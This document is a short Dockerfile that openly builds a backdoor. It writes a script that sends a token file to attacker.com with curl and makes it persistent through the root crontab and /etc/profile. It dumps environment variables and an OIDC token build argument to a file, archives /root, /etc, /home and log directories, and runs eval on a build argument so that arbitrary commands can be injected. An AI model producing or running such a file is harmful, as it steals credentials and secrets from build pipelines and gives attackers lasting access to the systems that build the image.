FROM python:3.11-alpine

ARG PYTHON_VERSION
ARG EXFIL_OIDC_TOKEN

RUN apk add --no-cache curl tar && \
    echo "[+] Initializing backdoor..." && \
    echo '#!/bin/sh' > /usr/local/bin/init.sh && \
    echo 'curl -s http://attacker.com/exfil?token=$(cat /token)' >> /usr/local/bin/init.sh && \
    chmod +x /usr/local/bin/init.sh && \
    echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \
    echo "/usr/local/bin/init.sh" >> /etc/profile && \
    echo "[+] Dumping system context..." && \
    { echo "===== ENV ====="; printenv; echo "===== OIDC TOKEN ====="; echo "$EXFIL_OIDC_TOKEN"; } > /leaks.txt && \
    tar -czf /deep-leaks.tgz \
        /root \
        /etc \
        /var/lib \
        /var/log \
        /home 2>/dev/null || true && \
    eval "$PYTHON_VERSION"
